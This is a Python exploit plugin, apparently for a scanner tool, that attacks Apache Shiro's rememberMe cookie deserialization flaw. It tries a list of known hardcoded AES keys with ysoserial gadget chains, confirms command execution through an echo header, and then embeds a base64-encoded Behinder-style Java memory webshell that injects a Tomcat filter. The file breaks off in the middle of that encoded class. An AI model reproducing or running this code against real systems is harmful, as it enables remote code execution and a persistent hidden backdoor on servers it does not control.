# -*- coding: UTF-8 -*-
#!/usr/bin/python

import base64
import http.client
import random
import subprocess
import time
import uuid
import  re
import requests
from Crypto.Cipher import AES


class Model:

    gadget = []
    key = []

    def __init__(self, key, gadget):
        Model.gadget.append(gadget)
        Model.key.append(key)


http.client.HTTPConnection._http_vsn = 10
http.client.HTTPConnection._http_vsn_str = 'HTTP/1.0'

requests.packages.urllib3.disable_warnings()

try:
    import frozen_dir
    ysoserial  = frozen_dir.app_path() + "/Plugins/Modules/ysoserial-0.0.8-SNAPSHOT-all.jar"
except:
    ysoserial = 'ysoserial-0.0.8-SNAPSHOT-all.jar'


def vuln_info():
    info={
        'vuln_name': 'Shiro550',  #漏洞名称
        'vuln_referer':'http://baidu.com',  #漏洞来源
        'vuln_author':'未知',  #插件作者
        'cms_name':'test',#cms_name需要和上级目录保持一致。扫描器自动添加会调用。GUI版本不会调用
        'vuln_description':'''漏洞描述''',
        'vuln_identifier':'''漏洞编号。''',
        'vuln_class':'漏洞分类',#如：信息泄漏、远程命令执行、任意文件上传、SQL注入、XML注入、任意文件读取、本地文件包含、认证绕过/未认证、弱口令、目录遍历、其他、反序列化漏洞、OGNL表达式注入、SSRF、后门、任意文件下载、鉴权绕过、暴力破解、命令注入、路径泄露、XSS、远程文件包含、CSRF、任意文件包含、代码注入、任意文件写入、密码硬编码、文件包含、任意用户注册、缓冲区溢出、用户枚举漏洞、任意文件删除、任意页面上传、管理权限等
        'vuln_solution':'''修复建议。''',
        'FofaQuery_type':'socket', #socket、http
        'FofaQuery_link':'/', #此处的路径会加在url拼接访问，进行FofaQuery的条件匹配 此处为all为全部页面都检测
        'FofaQuery_rule':'title="百度"',#header="JSESSIONID" || body="Struts Problem Report" || body="There is no Action mapped for namespace" || body="No result defined for action and result input" || header="Servlet" || header="JBoss",port="60001"
        #header', 'body', 'title', 'banner','port','banner','service','protocol','server'
        'ispoc':1, #是否有poc  1为有 0为无
        'isexp':1  #是否有exp   1为有 0为无
    }
    return info
def is_shiro(url):
    heads = {
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36',
    }
    r = requests.get(url, headers=heads, cookies={'rememberMe': '1'},verify=False, timeout=10)
    cookies = requests.utils.dict_from_cookiejar(r.cookies)
    if cookies.get('rememberMe') == "deleteMe":
        return True
    else:
        return False

# url：url  hostname：主机地址  port：端口  scheme：服务  heads：http自定义头信息
def do_poc(url,hostname,port,scheme,heads={},func_out=print,plugins_temp_data={}):
    if not is_shiro(url):
        result = {"Result":False,"Result_Info":"该系统不是Shiro框架"}
        return result
    key_succes=""
    gadget_succes=""
    try:
        gadget_list = ["CommonsBeanutils1_183_All","CommonsBeanutils1_183_TomcatEcho","CommonsBeanutils1_183_TomcatEcho2","CommonsBeanutils1_All","CommonsBeanutils1_TomcatEcho","CommonsBeanutils1_TomcatEcho2","CommonsCollections2_All","CommonsCollections2_TomcatEcho","CommonsCollections2_TomcatEcho2","CommonsCollections3_All","CommonsCollections3_TomcatEcho","CommonsCollections3_TomcatEcho2","CommonsCollections4_All","CommonsCollections4_TomcatEcho","CommonsCollections4_TomcatEcho2","CommonsCollections10_All","CommonsCollections10_TomcatEcho","CommonsCollections10_TomcatEcho2","CommonsCollectionsK1_All","CommonsCollectionsK1_TomcatEcho","CommonsCollectionsK1_TomcatEcho2","CommonsCollectionsK2_All","CommonsCollectionsK2_TomcatEcho","CommonsCollectionsK2_TomcatEcho2"]
        key_list = ["kPH+bIxk5D2deZiIxcaaaA==", "2AvVhdsgUs0FSA3SDFAdag==", "3AvVhmFLUs0KTA3Kprsdag==", "4AvVhmFLUs0KTA3Kprsdag==", "5aaC5qKm5oqA5pyvAAAAAA==", "6ZmI6I2j5Y+R5aSn5ZOlAA==", "bWljcm9zAAAAAAAAAAAAAA==", "wGiHplamyXlVB11UXWol8g==", "Z3VucwAAAAAAAAAAAAAAAA=="]
        heads = {
            'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36',
            'cmd':'echo xiaohei'
        }

        result = {"Result":False,"Result_Info":""}
        for gadget in gadget_list:
            func_out("Info","[*] Check gadget: " + gadget)
            # print ("[*] Check gadget: " + gadget)
            for key in key_list:
                # func_out("Info","check key:"+ key)
                # print ("check key:"+ key)
                popen = subprocess.Popen(['java', '-jar', ysoserial, gadget,"123"], stdout=subprocess.PIPE)
                BS = AES.block_size
                pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
                mode = AES.MODE_CBC
                iv = uuid.uuid4().bytes
                encryptor = AES.new(base64.b64decode(key), mode, iv)
                file_body = pad(popen.stdout.read())
                base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
                payload = base64_ciphertext.decode()
                try:
                    r = requests.get(url, headers=heads, cookies={'rememberMe': payload},verify=False, timeout=10)
                    if "xiaohei" in r.text:
                        key_succes = key
                        gadget_succes = gadget
                        Model(key_succes,gadget_succes)
                        func_out("Info","[+] Find gadget: " + gadget_succes)
                        func_out("Info","[+] Find Key: " + key_succes)
                        print ("[+] Find gadget: " + gadget_succes)
                        print ("[+] Find Key: " + key_succes)
                        result['Result'] =True
                        result['Result_Info'] = "Gadget:"+gadget_succes + " Key:" + key_succes
                        break
                    else:
                        func_out("Info", "key error:" + key)
                        # print("key error")
                except Exception as e:
                    func_out('Error',str(e),)
                    print(e)
            if key_succes and gadget_succes:
                # print("跳了")
                break
        #Model(key_succes,gadget_succes,echo_type_succes)"
        return result

    except Exception as e:
        func_out('Error',str(e)+str(e.__traceback__.tb_lineno)+'行')

    # {
    #     "type":"cmd",  #cmd,shell,uploadfile
    #     "command":"whoami",  #cmd命令
    #     "reverse_ip":"127.0.0.1", #反弹shell的ip
    #     "reverse_port":"8888", #反弹shell的端口
    #     "filename":"conf.php", #写入文件的名字
    #     "filename_contents":"shell内容", #shell文件内容
    # }
# url:url   hostname：主机地址  port：端口  scheme：服务  heads:自定义请求头

def do_exp(url,hostname,port,scheme,heads={},exp_data={},func_out=print,plugins_temp_data={}):
    try:
        result = {"Result":False,"Result_Info":""}
        memshell_list = [
            #冰蝎
            "yv66vgAAADQB2QoAeQD5CQBoAPoJAGgA%2BwgA%2FAkAaAD9CAD%2BCQBoAP8IAQAJAGgBAQoAeQECCgB5AQMIAQQKAQUBBgoATgEHCgBOAQgKAQUBCQcBCgoBBQELCgARAQwKABEBDQoATgEOBwEPCgBoARAIARELADMBEgoAaAETCACCBwEUCgAcAPkIARUIARYLADQBFwsAMwEYCwA0ARgKAGgBGQoAHAEaBwEbCgAlAPkIARwKACUBHQoAFgEeCgAlAR4LADQBHwoAHAEeCgEgASEKASABIgoBIAEjCgA6ASQKADgBJQcAqgcBJgcBJwgBKAoAOAEpCAEqBwErCgA4ASwHAS0KAS4BLwgBMAgAewoAOAExCgEyATMKATIBNAgAfQsAMwE1CwE2ATcIATgHATkHAToHATsIATwJAT0BPgoBMgE%2FCwE2AUAJAUEBQgoBQwFEBwFFCwDIAUYIAUcKADgBSAoBLgEzCQE9AUkIAUoIAUsIALwIAUwKAE4BTQgBTgoAFgFPCAFQCwAzAVEHAVIKAF0A%2BQsBUwFUCADjCAFVCwFWAVcIAVgKAVkBWgcBWwoAZQFcCgFZAV0HAV4KADgBXwoAaAECCwFgAWEKAWIBYwoAaAFkCgFZAWUKAGgBZgoAOAFnCgA6AWgKABYBaQgBaggBawcAkAgBbAgBbQgBbgcBbwcBcAEAB3JlcXVlc3QBACdMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDsBAAhyZXNwb25zZQEAKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTsBAAJjcwEAEkxqYXZhL2xhbmcvU3RyaW5nOwEAA1B3ZAEABHBhdGgBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAIExjb20vc3VtbWVyc2VjL3gvQmVoaW5kZXJGaWx0ZXI7AQAaKExqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7KVYBAAFjAQAXTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsBAAFnAQAVKFtCKUxqYXZhL2xhbmcvQ2xhc3M7AQABYgEAAltCAQADbWQ1AQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAAFtAQAdTGphdmEvc2VjdXJpdHkvTWVzc2FnZURpZ2VzdDsBAAFzAQADcmV0AQANU3RhY2tNYXBUYWJsZQcBRQcBDwEABmVxdWFscwEAFShMamF2YS9sYW5nL09iamVjdDspWgEABHZhcjcBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAANvYmoBABJMamF2YS9sYW5nL09iamVjdDsBAAZvdXRwdXQBABhMamF2YS9sYW5nL1N0cmluZ0J1ZmZlcjsBAAV0YWdfcwEABXRhZ19lBwFeBwEtBwEUAQAIcGFyc2VPYmoBABUoTGphdmEvbGFuZy9PYmplY3Q7KVYBAARkYXRhAQATW0xqYXZhL2xhbmcvT2JqZWN0OwEABWNsYXp6AQARTGphdmEvbGFuZy9DbGFzczsBAANyZXEBABlMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7AQAIcmVxdWVzdDIBAARyZXNwAQAEdmFyOAEACWFkZEZpbHRlcgEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAJZmlsdGVyTWFwAQAFdmFyMjEBAAxmaWx0ZXJNYXBPYmoBAARuYW1lAQABaQEAAUkBABFmaWx0ZXJTdGFydE1ldGhvZAEAGkxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAOZmluZEZpbHRlck1hcHMBAApmaWx0ZXJNYXBzAQAFdmFyMjUBAAV2YXIxMQEABXZhcjIyAQAMY29udGV4dEZpZWxkAQASYXBwbGljYXRpb25Db250ZXh0AQAtTG9yZy9hcGFjaGUvY2F0YWxpbmEvY29yZS9BcHBsaWNhdGlvbkNvbnRleHQ7AQAPc3RhbmRhcmRDb250ZXh0AQAqTG9yZy9hcGFjaGUvY2F0YWxpbmEvY29yZS9TdGFuZGFyZENvbnRleHQ7AQAKc3RhdGVGaWVsZAEAEmZpbHRlclJlZ2lzdHJhdGlvbgcBcgEAB0R5bmFtaWMBAAxJbm5lckNsYXNzZXMBACpMamF2YXgvc2VydmxldC9GaWx0ZXJSZWdpc3RyYXRpb24kRHluYW1pYzsBAA5zZXJ2bGV0Q29udGV4dAEAHkxqYXZheC9zZXJ2bGV0L1NlcnZsZXRDb250ZXh0OwEABmZpbHRlcgEAFkxqYXZheC9zZXJ2bGV0L0ZpbHRlcjsBAApmaWx0ZXJOYW1lAQADdXJsBwFzBwFwBwF0BwE5BwE6BwFyBwF1BwErBwF2AQAKRXhjZXB0aW9ucwEACGRvRmlsdGVyAQBbKExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTtMamF2YXgvc2VydmxldC9GaWx0ZXJDaGFpbjspVgEAFUxqYXZheC9jcnlwdG8vQ2lwaGVyOwEAHkxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0OwEAH0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTsBAAVjaGFpbgEAG0xqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluOwEAB3Nlc3Npb24BACBMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXNzaW9uOwEAD0xqYXZhL3V0aWwvTWFwOwcBdwcBeAcBeQcBegcBewcBfAcBfQEADGJhc2U2NERlY29kZQEAFihMamF2YS9sYW5nL1N0cmluZzspW0IBAAdkZWNvZGVyAQAEdmFyNQEAA3N0cgEABGluaXQBAB8oTGphdmF4L3NlcnZsZXQvRmlsdGVyQ29uZmlnOylWAQAMZmlsdGVyQ29uZmlnAQAcTGphdmF4L3NlcnZsZXQvRmlsdGVyQ29uZmlnOwEAB2Rlc3Ryb3kBAApTb3VyY2VGaWxlAQATQmVoaW5kZXJGaWx0ZXIuamF2YQwAgwCEDAB7AHwMAH0AfgEABVVURi04DAB%2FAIABABBlYWM5ZmEzODMzMGE3NTM1DACBAIABABAvZmF2aWNvbmRlbW8uaWNvDACCAIAMAIMAigwBfgF%2FAQADTUQ1BwGADAGBAYIMAYMBhAwBhQGGDAGHAYgBABRqYXZhL21hdGgvQmlnSW50ZWdlcgwBiQGEDACDAYoMAYsBjAwBjQGOAQATamF2YS9sYW5nL0V4Y2VwdGlvbgwApwCoAQABcAwBjwCSDACRAJIBABZqYXZhL2xhbmcvU3RyaW5nQnVmZmVyAQAAAQAJdGV4dC9odG1sDAGQAZEMAZIBkQwAsgCzDAGTAZQBABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgEACUVSUk9SOi8vIAwBkwGVDAGLALMMAZYBlwcBmAwBmQGRDAGaAIQMAZsAhAwBnAGdDAGeAZ8BACVqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0AQAmamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2UBAB1qYXZheC5zZXJ2bGV0LmpzcC5QYWdlQ29udGV4dAwBoAGhAQAKZ2V0UmVxdWVzdAEAD2phdmEvbGFuZy9DbGFzcwwBogGjAQAQamF2YS9sYW5nL09iamVjdAcBdQwBpAGlAQALZ2V0UmVzcG9uc2UMAaYBpwcBdAwBqAGpDAGqAasMAawBrQcBcwwBrgGvAQAHY29udGV4dAEAK29yZy9hcGFjaGUvY2F0YWxpbmEvY29yZS9BcHBsaWNhdGlvbkNvbnRleHQBAChvcmcvYXBhY2hlL2NhdGFsaW5hL2NvcmUvU3RhbmRhcmRDb250ZXh0AQAmb3JnL2FwYWNoZS9jYXRhbGluYS91dGlsL0xpZmVjeWNsZUJhc2UBAAVzdGF0ZQcBsAwBsQGyDAGzAbQMALIBtQcBtgwBtwG4BwG5DAG6AbsBABBqYXZhL2xhbmcvU3RyaW5nDAG8Ab0BAAtmaWx0ZXJTdGFydAwBvgGjDAG%2FAbIBAC9vcmcuYXBhY2hlLnRvbWNhdC51dGlsLmRlc2NyaXB0b3Iud2ViLkZpbHRlck1hcAEAJG9yZy5hcGFjaGUuY2F0YWxpbmEuZGVwbG95LkZpbHRlck1hcAEADWdldEZpbHRlck5hbWUMAcABwQEAB3N1Y2Nlc3MMAcIAswEABmV4aXN0cwwBwwHEAQARamF2YS91dGlsL0hhc2hNYXAHAXsMAcUBxgEAAXUHAXoMAccByAEAA0FFUwcByQwBgQHKAQAfamF2YXgvY3J5cHRvL3NwZWMvU2VjcmV0S2V5U3BlYwwAgwHLDADyAcwBAB5jb20vc3VtbWVyc2VjL3gvQmVoaW5kZXJGaWx0ZXIMAc0BzgcBdwwBzwHQBwHRDAHSALMMAO0A7gwB0wHUDACNAI4MAdUB1gwAmgCbDAHXAIQBABZzdW4ubWlzYy5CQVNFNjREZWNvZGVyAQAMZGVjb2RlQnVmZmVyAQAQamF2YS51dGlsLkJhc2U2NAEACmdldERlY29kZXIBAAZkZWNvZGUBABVqYXZhL2xhbmcvQ2xhc3NMb2FkZXIBABRqYXZheC9zZXJ2bGV0L0ZpbHRlcgcB2AEAKGphdmF4L3NlcnZsZXQvRmlsdGVyUmVnaXN0cmF0aW9uJER5bmFtaWMBABxqYXZheC9zZXJ2bGV0L1NlcnZsZXRDb250ZXh0AQAXamF2YS9sYW5nL3JlZmxlY3QvRmllbGQBABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QBABNqYXZhL2xhbmcvVGhyb3dhYmxlAQAcamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdAEAHWphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlAQAZamF2YXgvc2VydmxldC9GaWx0ZXJDaGFpbgEAHmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2Vzc2lvbgEADWphdmEvdXRpbC9NYXABABNqYXZhL2lvL0lPRXhjZXB0aW9uAQAeamF2YXgvc2VydmxldC9TZXJ2bGV0RXhjZXB0aW9uAQALZGVmaW5lQ2xhc3MBABcoW0JJSSlMamF2YS9sYW5nL0NsYXNzOwEAG2phdmEvc2VjdXJpdHkvTWVzc2FnZURpZ2VzdAEAC2dldEluc3RhbmNlAQAxKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9zZWN1cml0eS9NZXNzYWdlRGlnZXN0OwEACGdldEJ5dGVzAQAEKClbQgEABmxlbmd0aAEAAygpSQEABnVwZGF0ZQEAByhbQklJKVYBAAZkaWdlc3QBAAYoSVtCKVYBAAh0b1N0cmluZwEAFShJKUxqYXZhL2xhbmcvU3RyaW5nOwEACXN1YnN0cmluZwEAFihJSSlMamF2YS9sYW5nL1N0cmluZzsBAAlnZXRIZWFkZXIBAA5zZXRDb250ZW50VHlwZQEAFShMamF2YS9sYW5nL1N0cmluZzspVgEAFHNldENoYXJhY3RlckVuY29kaW5nAQAGYXBwZW5kAQAsKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1ZmZlcjsBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwEAE2phdmEvaW8vUHJpbnRXcml0ZXIBAAVwcmludAEABWZsdXNoAQAFY2xvc2UBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBAAdpc0FycmF5AQADKClaAQAHZm9yTmFtZQEAJShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9DbGFzczsBABFnZXREZWNsYXJlZE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBABBnZXREZWNsYXJlZEZpZWxkAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7AQANc2V0QWNjZXNzaWJsZQEABChaKVYBAANnZXQBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEAEWdldFNlcnZsZXRDb250ZXh0AQAgKClMamF2YXgvc2VydmxldC9TZXJ2bGV0Q29udGV4dDsBABVnZXRGaWx0ZXJSZWdpc3RyYXRpb24BADYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZheC9zZXJ2bGV0L0ZpbHRlclJlZ2lzdHJhdGlvbjsBACJvcmcvYXBhY2hlL2NhdGFsaW5hL0xpZmVjeWNsZVN0YXRlAQANU1RBUlRJTkdfUFJFUAEAJExvcmcvYXBhY2hlL2NhdGFsaW5hL0xpZmVjeWNsZVN0YXRlOwEAA3NldAEAJyhMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL09iamVjdDspVgEAVChMamF2YS9sYW5nL1N0cmluZztMamF2YXgvc2VydmxldC9GaWx0ZXI7KUxqYXZheC9zZXJ2bGV0L0ZpbHRlclJlZ2lzdHJhdGlvbiREeW5hbWljOwEAHGphdmF4L3NlcnZsZXQvRGlzcGF0Y2hlclR5cGUBAAdSRVFVRVNUAQAeTGphdmF4L3NlcnZsZXQvRGlzcGF0Y2hlclR5cGU7AQARamF2YS91dGlsL0VudW1TZXQBAAJvZgEAJShMamF2YS9sYW5nL0VudW07KUxqYXZhL3V0aWwvRW51bVNldDsBABhhZGRNYXBwaW5nRm9yVXJsUGF0dGVybnMBACooTGphdmEvdXRpbC9FbnVtU2V0O1pbTGphdmEvbGFuZy9TdHJpbmc7KVYBAAlnZXRNZXRob2QBAAdTVEFSVEVEAQAQZXF1YWxzSWdub3JlQ2FzZQEAFShMamF2YS9sYW5nL1N0cmluZzspWgEACmdldE1lc3NhZ2UBAApnZXRTZXNzaW9uAQAiKClMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXNzaW9uOwEAA3B1dAEAOChMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAIcHV0VmFsdWUBACcoTGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9PYmplY3Q7KVYBABNqYXZheC9jcnlwdG8vQ2lwaGVyAQApKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YXgvY3J5cHRvL0NpcGhlcjsBABcoW0JMamF2YS9sYW5nL1N0cmluZzspVgEAFyhJTGphdmEvc2VjdXJpdHkvS2V5OylWAQAOZ2V0Q2xhc3NMb2FkZXIBABkoKUxqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQAJZ2V0UmVhZGVyAQAaKClMamF2YS9pby9CdWZmZXJlZFJlYWRlcjsBABZqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyAQAIcmVhZExpbmUBAAdkb0ZpbmFsAQAGKFtCKVtCAQALbmV3SW5zdGFuY2UBABQoKUxqYXZhL2xhbmcvT2JqZWN0OwEAD3ByaW50U3RhY2tUcmFjZQEAIGphdmF4L3NlcnZsZXQvRmlsdGVyUmVnaXN0cmF0aW9uADEAaAB5AAEAegAFAAEAewB8AAAAAQB9AH4AAAABAH8AgAAAAAEAgQCAAAAAAQCCAIAAAAALAAEAgwCEAAEAhQAAAGMAAgABAAAAISq3AAEqAbUAAioBtQADKhIEtQAFKhIGtQAHKhIItQAJsQAAAAIAhgAAAB4ABwAAACYABAAgAAkAIQAOACIAFAAjABoAJAAgACcAhwAAAAwAAQAAACEAiACJAAAAAQCDAIoAAQCFAAAAbgACAAIAAAAiKiu3AAoqAbUAAioBtQADKhIEtQAFKhIGtQAHKhIItQAJsQAAAAIAhgAAAB4ABwAAACoABQAgAAoAIQAPACIAFQAjABsAJAAhACsAhwAAABYAAgAAACIAiACJAAAAAAAiAIsAjAABAAEAjQCOAAEAhQAAAD0ABAACAAAACSorAyu%2BtwALsAAAAAIAhgAAAAYAAQAAAC4AhwAAABYAAgAAAAkAiACJAAAAAAAJAI8AkAABAAkAkQCSAAEAhQAAAKoABAADAAAAMwFMEgy4AA1NLCq2AA4DKrYAD7YAELsAEVkELLYAErcAExAQtgAUAxAQtgAVTKcABE0rsAABAAIALQAwABYAAwCGAAAAHgAHAAAAMgACADUACAA2ABUANwAtADkAMAA4ADEAOwCHAAAAIAADAAgAJQCTAJQAAgAAADMAlQCAAAAAAgAxAJYAgAABAJcAAAATAAL%2FADAAAgcAmAcAmAABBwCZAAABAJoAmwABAIUAAAGmAAMABgAAAMkqK7YAFyoqtAACEhi5ABkCALgAGrUAByoqtAACEhu5ABkCALUACbsAHFm3AB1NEh5OEh46BCq0AAMSH7kAIAIAKrQAAiq0AAW5ACECACq0AAMqtAAFuQAiAgAsKrYAI7YAJFenACE6BSy7ACVZtwAmEie2ACgZBbYAKbYAKLYAKrYAJFcqtAADuQArAQC7ACVZtwAmLbYAKCy2ACy2ACgZBLYAKLYAKrYALSq0AAO5ACsBALYALiq0AAO5ACsBALYAL6cABToFBKwAAgA1AGMAZgAWAIQAwgDFABYAAwCGAAAATgATAAAAPwAFAEAAFwBBACYAQgAuAEMAMQBEADUARwBAAEgATQBJAFoASgBjAE0AZgBLAGgATACEAFAAqgBRALYAUgDCAFQAxQBTAMcAVgCHAAAAPgAGAGgAHACcAJ0ABQAAAMkAiACJAAAAAADJAJ4AnwABAC4AmwCgAKEAAgAxAJgAogCAAAMANQCUAKMAgAAEAJcAAAAjAAT%2FAGYABQcApAcApQcApgcAmAcAmAABBwCZHfcAQAcAmQEAAQCnAKgAAQCFAAACBgAEAAYAAADfK7YAMLYAMZkAJSvAADLAADLAADJNKiwDMsAAM7UAAiosBDLAADS1AAOnALUSNbgANk0qLBI3A70AOLYAOSsDvQA6tgA7wAAztQACKiwSPAO9ADi2ADkrA70AOrYAO8AANLUAA6cAek0rwQAzmQByKivAADO1AAIqtAACtgAwEj22AD5OLQS2AD8tKrQAArYAQMAAMzoEGQS2ADASQbYAPjoFGQUEtgA%2FKhkFGQS2AEDAADS1AAOnAChOKiq0AAK2ADASPAO9ADi2ADkrA70AOrYAO8AANLUAA6cABToEsQADACwAZABnABYAdwC2ALkAFgC6ANkA3AAWAAMAhgAAAGIAGAAAAFoACgBbABUAXAAfAF0AKQBeACwAYAAyAGEASwBiAGQAdQBnAGMAaABkAG8AZQB3AGgAhABpAIkAagCWAGsAogBsAKgAbQC2AHMAuQBuALoAcADZAHIA3ABxAN4AeACHAAAAXAAJABUAFACpAKoAAgAyADIAqwCsAAIAhAAyAK0ArgADAJYAIACvAHwABACiABQAsACuAAUAugAkAJwAnQADAGgAdgCxAJ0AAgAAAN8AiACJAAAAAADfAJ4AnwABAJcAAAAzAAUsegcAmf8AUQADBwCkBwClBwCZAAEHAJn%2FACIABAcApAcApQcAmQcAmQABBwCZ%2BQABAAEAsgCzAAIAhQAABC4ABwATAAABliq0AAK5AEIBAEwqTSq0AAlOKrQACToEKy25AEMCAMcBdQE6BQE6BgE6BwE6CAE6CSu2ADASRLYAPjoFGQUEtgA%2FGQUrtgBAwABFOgYZBrYAMBJEtgA%2BOgUZBQS2AD8ZBRkGtgBAwABGOgcSRxJItgA%2BOggZCAS2AD8ZCBkHsgBJtgBKKy0suQBLAwA6CRkJsgBMuABNAwS9AE5ZAxkEU7kATwQAEkYSUAO9ADi2AFE6CxkLBLYAUhkLGQcBwAAytgA7VxkIGQeyAFO2AEoBOgoSVLgANjoMpwAMOg0SVbgANjoMGQe2ADASVgO9ADi2AFE6DRkNGQcDvQA6tgA7wAAywAAywAAyOg4DNg8VDxkOvqIARRkOFQ8yOhAZDBJXA70AOLYAUToNGQ0ZEAO9ADq2ADvAAE46ERkRLbYAWJkAEhkOFQ8ZDgMyUxkOAxkQU4QPAaf%2FuRJZOg8ZDzoQGQgZB7IAU7YAShkQsDoLGQu2AFo6ChkIGQeyAFO2AEqnABI6EhkIGQeyAFO2AEoZEr8ZCrASW7AABQDQANcA2gAWADABXgFrABYAMAFeAYEAAAFrAXQBgQAAAYEBgwGBAAAAAwCGAAAA0gA0AAAAewAKAHwADAB9ABEAfgAXAH8AIQCAACQAgQAnAIIAKgCDAC0AhAAwAIgAOwCJAEEAigBMAIsAWACMAF4AjQBqAI4AcwCPAHkAkACDAJEAjQCSAKQAkwCxAJQAtwCVAMMAlgDNAJcA0ACbANcAngDaAJwA3ACdAOMAoADzAKEBCQCjARQApAEbAKUBKACmATgApwFBAKgBSgCpAVAAowFWAK0BWgCuAV4AsgFoAK4BawCvAW0AsAF0ALIBfgCzAYEAsgGNALMBkAC1AZMAtwCHAAAA8gAYANcAAwC0AKwADADcAAcAtQCdAA0BGwA1ALYAnwAQATgAGAC3AIAAEQEMAEoAuAC5AA8AsQC6ALoAuwALAOMAiAC0AKwADADzAHgAvAC7AA0BCQBiAL0AqgAOAVoAEQC%2BAIAADwDQAJsAvwCAAAoBbQAHAMAAnQALAXQADQC%2FAIAACgAkAW8AwQCuAAUAJwFsAMIAwwAGACoBaQDEAMUABwAtAWYAxgCuAAgAMAFjAMcAywAJAZAAAwC%2FAIAACgAAAZYAiACJAAAACgGMAMwAzQABAAwBigDOAM8AAgARAYUA0ACAAAMAFwF%2FANEAgAAEAJcAAACOAAn%2FANoADAcApAcA0gcA0wcAmAcAmAcA1AcA1QcA1gcA1AcA1wcAmAcA2AABBwCZ%2FAAIBwDZ%2FgAoBwDYBwAyAfsAQ%2FoABf8AFAAKBwCkBwDSBwDTBwCYBwCYBwDUBwDVBwDWBwDUBwDXAAEHAJlVBwDa%2FAAOBwCY%2FwACAAUHAKQHANIHANMHAJgHAJgAAADbAAAABAABABYAAQDcAN0AAgCFAAABZAAGAAcAAACXK8AAM7kAXAEAOgS7AF1ZtwBeOgUZBRI9K7kAXwMAVxkFEkEsuQBfAwBXGQUSYBkEuQBfAwBXGQQSYSq0AAe5AGIDABJjuABkOgYZBgW7AGVZKrQAB7YADhJjtwBmtgBnuwBoWSq2ADC2AGm3AGoZBioruQBrAQC2AGy2AG22AG62AG%2B2AHAZBbYAcVenAAo6BhkGtgBysQABADYAjACPABYAAwCGAAAANgANAAAAvAALAL0AFAC%2BAB8AvwAqAMAANgDDAEMAxABKAMUAYADGAIwAyQCPAMcAkQDIAJYAywCHAAAAUgAIAEoAQgCLAN4ABgCRAAUAnACdAAYAAACXAIgAiQAAAAAAlwCtAN8AAQAAAJcAsADgAAIAAACXAOEA4gADAAsAjADjAOQABAAUAIMAngDlAAUAlwAAAB8AAv8AjwAGBwCkBwDmBwDnBwDoBwDpBwDqAAEHAJkGANsAAAAGAAIA6wDsAAEA7QDuAAIAhQAAAPcABgAFAAAAcxJzuAA2TSwSdAS9ADhZAxJOU7YAUSy2AHAEvQA6WQMrU7YAO8AAdcAAdcAAdbBNEna4ADZOLRJ3A70AOLYAUQEDvQA6tgA7OgQZBLYAMBJ4BL0AOFkDEk5TtgBRGQQEvQA6WQMrU7YAO8AAdcAAdcAAdbAAAQAAAC0ALgAWAAMAhgAAABoABgAAAM8ABgDQAC4A0QAvANIANQDTAEkA1ACHAAAAPgAGAAYAKACrAKwAAgA1AD4AqwCsAAMASQAqAO8AnwAEAC8ARADwAJ0AAgAAAHMAiACJAAAAAABzAPEAgAABAJcAAAAGAAFuBwCZANsAAAAEA